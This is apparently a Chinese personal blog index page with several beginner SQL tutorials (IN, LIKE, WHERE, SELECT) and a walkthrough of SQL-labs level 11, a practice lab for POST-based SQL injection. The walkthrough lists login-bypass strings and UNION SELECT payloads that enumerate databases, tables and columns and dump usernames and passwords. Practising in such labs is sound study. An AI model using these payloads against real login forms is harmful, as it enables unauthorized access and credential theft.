        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ol>
<li>掌握运算符in的使用</li>
<li>掌握运算符like的使用</li>
</ol>
<h1 id="一、运算符in的使用"><a href="#一、运算符in的使用" class="headerlink" title="一、运算符in的使用"></a>一、运算符in的使用</h1><p>运算符 IN 允许我们在 WHERE 子句中过滤某个字段的多个值。<br>==where子句使用in语法==<br><code>SELECT column_name FROM table_name WHERE column_name IN(value1, value2, …)</code></p>
<p>适用于多条件查询，使用时更加方便简洁，比如同时查询ID=1,ID=2,ID=3的员工：<br><code>select * from employee where id in(123);</code><br><img  src="https://img-blog.csdnimg.cn/20210518200902530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h1 id="二、运算符like的使用"><a href="#二、运算符like的使用" class="headerlink" title="二、运算符like的使用"></a>二、运算符like的使用</h1><p>在where子句中，有时候我们需要查询包含xxx 字符串的所有记录，这时就需要用到运算符like。<br>==where子句使用like语法==</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> column_name <span class="hljs-keyword">LIKE</span> ‘<span class="hljs-operator">%</span><span class="hljs-keyword">value</span><span class="hljs-operator">%</span>’<br></code></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li>1、LIKE子句中的%类似于正则表达式中的*，匹配任意0个或多个字符</li>
<li>2、LIKE子句中的_匹配任意单个字符</li>
<li>3、LIKE子句中如果没有%和_，就相当于运算符=的效果</li>
</ul>
<p>比如想要查询名字是<strong>l</strong> 开头的人：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> name <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;l%&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210518201317511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>则l开头的人名则全被筛选出来，如果我们想要筛选出来名字是两个字的那么：要用到<code>-</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> name <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;l_&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/2021051820172245.png"  ><span class="image-caption">在这里插入图片描述</span><br>在这里<code>-</code> 充当的是单个字符。</p>
<p>如果<code>%放在前面则可以筛选条件后面的信息</code>，比如筛选名字最后为<strong>g</strong>的人：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> name <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%g&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210518202033646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>同样如果<code>%放在中间的话，则可以筛选出，信息中间部分的条件</code>，比如筛选出性别中间是<strong>o</strong>的人的信息：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> employee <span class="hljs-keyword">where</span> sex <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%o%&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210518202545901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2021/06/05/POST%E6%B3%A8%E5%85%A5-SQL-labs(11%E5%85%B3)/">POST注入-SQL-labs(11关)</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2021-06-05T07:48:43.957Z" itemprop="datePublished">
    2021-06-05
  </time>
  
  
</div>

    </header>
    <div>
      
        <h1 id="一、万能密码"><a href="#一、万能密码" class="headerlink" title="一、万能密码"></a>一、万能密码</h1><p>对于万能密码的类型是根据SQL注入的情况而判断的，这里举例几个SQL注入中常见的几个类型：</p>
<ol>
<li>xxx’ or 1 = 1#(最后的#可以换成– (记住如果是– 的最后有个空格)) 【这种是比较通用的】</li>
<li>xxx’ or ‘1’ = ‘1(最后可以加#或者加– (记住如果是– 的最后有个空格))</li>
<li>xxx” or “1” = “1</li>
<li>xxx”) or (“1”) = (“1 </li>
<li><hr>
</li>
</ol>
<p><strong>其实对于表单注入：在用户名密码框当中同样是通过select语句进行查询，只不过从原来的get方法改成了post方法，此时也可进行注入。</strong></p>
<h1 id="二、判断闭合符号"><a href="#二、判断闭合符号" class="headerlink" title="二、判断闭合符号"></a>二、判断闭合符号</h1><p>在登录框中输入<code>xxx &#39; or 1#</code> 和<code>xxx &quot; or 1#</code> 根据回显分别进行判断</p>
<p><img  src="https://img-blog.csdnimg.cn/20210509150327543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210509150518191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>根据回显可以发现这里是基于单引号的字符型注入</p>
<h1 id="三、查询列数"><a href="#三、查询列数" class="headerlink" title="三、查询列数"></a>三、查询列数</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">XXX <span class="hljs-string">&#x27;order by 2 #</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210509151050140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">xxx <span class="hljs-string">&#x27;order by 3 #</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210509151305172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看出列数为2</p>
<h1 id="四、找显示位"><a href="#四、找显示位" class="headerlink" title="四、找显示位"></a>四、找显示位</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">xxx <span class="hljs-string">&#x27; union select 1,2 #</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210509162254150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h1 id="五、爆数据库"><a href="#五、爆数据库" class="headerlink" title="五、爆数据库"></a>五、爆数据库</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">xxx<span class="hljs-string">&#x27; union select 1,database()#</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210509162516743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h1 id="六、爆表名"><a href="#六、爆表名" class="headerlink" title="六、爆表名"></a>六、爆表名</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">xxx<span class="hljs-string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210509162955751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h1 id="七、爆列名"><a href="#七、爆列名" class="headerlink" title="七、爆列名"></a>七、爆列名</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">xxx<span class="hljs-string">&#x27; union select 1,group_concat(column_name) from information_schema.COLUMNs where table_schema=&#x27;</span>security<span class="hljs-string">&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210509163551689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h1 id="八、字段信息"><a href="#八、字段信息" class="headerlink" title="八、字段信息"></a>八、字段信息</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">xxx<span class="hljs-string">&#x27; union select 1,group_concat(concat_ws(&quot;,&quot;,username,password) SEPARATOR &quot;|&quot;) from users #</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210509163917882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h1 id="九、万能密码构造（说明）"><a href="#九、万能密码构造（说明）" class="headerlink" title="九、万能密码构造（说明）"></a>九、万能密码构造（说明）</h1><p>当我们进行判断时，可以对报错信息进行分析<img  src="https://img-blog.csdnimg.cn/20210509164552556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>据此报错，我们大概的可以猜测其网站的正常是SQL语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">MATHJAX<span class="hljs-operator">-</span>SSR<span class="hljs-number">-20</span>username<span class="hljs-string">&#x27; and password=&#x27;</span>$password<span class="hljs-string">&#x27; limit 0,1&quot;</span><br></code></pre></td></tr></table></figure>
<p>因此账号密码同时尝试输入：<code>admin&#39; or &#39;1&#39;=&#39;1#</code><img  src="https://img-blog.csdnimg.cn/20210509173457214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>我们来看一下解释<img  src="https://img-blog.csdnimg.cn/20210509173530412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2021/06/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%EF%BC%88%E4%BA%8C%EF%BC%89-%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2/">数据库查询语句（二）-条件查询</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2021-06-05T07:48:43.955Z" itemprop="datePublished">
    2021-06-05
  </time>
  
  
</div>

    </header>
    <div>
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h3>1. 熟练掌握where子句各类运算符的使用</h3>
<h3>2. 熟练掌握多条件查询and、or的使用


<h1 id="一、单条件查询"><a href="#一、单条件查询" class="headerlink" title="一、单条件查询"></a>一、单条件查询</h1><p>在SQL中，insert、update、delete和select后面都能带where子句，用于插入、修改、删除或查询指定条件的记录</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> column_name 运算符 <span class="hljs-keyword">value</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210508093514522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<p>语句:<code>select * from table_name where column_name 运算符 value;</code><br><img  src="https://img-blog.csdnimg.cn/20210508103718355.png"  ><span class="image-caption">在这里插入图片描述</span><br><strong>下面是查询不等于Dumb的名单</strong><br><img  src="https://img-blog.csdnimg.cn/20210508103859433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<p><strong>大于等于</strong><br><img  src="https://img-blog.csdnimg.cn/20210508104038347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>Between语句</strong><br><img  src="https://img-blog.csdnimg.cn/20210508104232768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h1 id="二、多条件查询"><a href="#二、多条件查询" class="headerlink" title="二、多条件查询"></a>二、多条件查询</h1><p>在where子句中，使用and、or可以把两个或多个过滤条件结合起来。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> condition1 <span class="hljs-keyword">AND</span> condition2 <span class="hljs-keyword">OR</span> condition3<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210508093617634.png"  ><span class="image-caption">在这里插入图片描述</span></p>
<p><strong>AND语句：进行查询id&gt;=3 并且Password =‘admin’的数据</strong><br><img  src="https://img-blog.csdnimg.cn/20210508104452501.png"  ><span class="image-caption">在这里插入图片描述</span><br><strong>or语句：id&gt;=3或者password=’Dumb’的数据都可以显示出来</strong><br><img  src="https://img-blog.csdnimg.cn/20210508104644987.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<p><strong>多个条件时</strong><br><img  src="https://img-blog.csdnimg.cn/20210508105253541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看到这里明明是筛选ID&gt;=6的为什么还会出现ID=2-5的呢这是因为<img  src="https://img-blog.csdnimg.cn/20210508105451208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>AND语句连接的是前面条件，OR语句条件作业在第三个条件因此也就同时输出了第三个条件的内容，如果想要输出符合条件的数据只需要在条件范围内用<code>（）</code>包括就可以了<img  src="https://img-blog.csdnimg.cn/20210508105917494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2021/06/05/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%8D%E6%AC%A1%E5%AD%A6%E4%B9%A0-%E7%AE%80%E5%8D%95%E6%9F%A5%E8%AF%A2/">延时注入-sql注入第九关</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2021-06-05T07:48:43.953Z" itemprop="datePublished">
    2021-06-05
  </time>
  
  
</div>

    </header>
    <div>
      
        <h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><pre><code>1. 了解select的完整语法
</code></pre>
<p>==2. 掌握使用select进行简单查询==</p>
<h1 id="一、基础语法掌握"><a href="#一、基础语法掌握" class="headerlink" title="一、基础语法掌握"></a>一、基础语法掌握</h1><p>在之前的文章有过对数据库的简单介绍了，今天我们对select语句进行一下细致的学习🕵️‍♂️</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name1, column_name2 <span class="hljs-comment">--选取字段</span><br><span class="hljs-keyword">FROM</span> table_name <span class="hljs-comment">--选取哪张表</span><br>[<span class="hljs-keyword">WHERE</span> where_condition] <span class="hljs-comment">--查询条件</span><br>[GROUP BY &#123;col_name | expr | position&#125;, ... [WITH ROLLUP]]  --分组<br>[<span class="hljs-keyword">HAVING</span> where_condition]  <span class="hljs-comment">--分组后条件筛选</span><br>[ORDER BY &#123;col_name | expr | position&#125; [ASC | DESC], ... [WITH ROLLUP]] --排序<br>[LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] --分页<br></code></pre></td></tr></table></figure>
<h1 id="二、简单查询内容"><a href="#二、简单查询内容" class="headerlink" title="二、简单查询内容"></a>二、简单查询内容</h1><p>在这里主要记录前三条查询语句的学习，进行大致的了解</p>
<h2 id="字段查询"><a href="#字段查询" class="headerlink" title="字段查询"></a>字段查询</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name1, column_name2<br></code></pre></td></tr></table></figure>
<p><strong>获取表</strong><br><img  src="https://img-blog.csdnimg.cn/2021050809062353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> table_name; <span class="hljs-comment">--列出表中所有字段</span><br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210508090724923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name1, column_name2 <span class="hljs-keyword">from</span> table_name;<br></code></pre></td></tr></table></figure>
<p><strong>选取想要查询的字段</strong><br><img  src="https://img-blog.csdnimg.cn/20210508091026314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看到这里过滤的id字段的内容，得到了我们想要的字段内容</p>
<p><strong>查询条件</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> column_name1, column_name2 form table_name <span class="hljs-keyword">where</span> <span class="hljs-string">&#x27;where_condition&#x27;</span> ;<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210508091633725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>掌握这些就可以进行基本的查询语句了，当然select语句有很多的用法，例如呢：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">99</span><span class="hljs-operator">*</span><span class="hljs-number">99</span>;<br></code></pre></td></tr></table></figure>
<p><img  src="https://img-blog.csdnimg.cn/20210508091902416.png"  ><span class="image-caption">在这里插入图片描述</span><br>这样就变成了一个小计算器，是不是很有意思🤭🤭</p>

      
    </div>
</article>

    </li>
  
</ul>

  <section id="nav-wrapper">
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">next »</a>
    </nav>
  </section>


            <footer>
    <div>© 2021 - Willianhuanbian </div>
    <div>
        <span>
            Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
        </span>
        ,
        <span>
            Theme - <a target="_blank" rel="noopener" href="https://github.com/nameoverflow/hexo-theme-icalm">Icalm</a>
        </span>
    </div>
</footer>

        </div>
    </div>
</div>

<script src="/js/pager/dist/singlepager.js"></script>

<script>
var sp = new Pager('data-pager-shell')

</script>
</body>
</html>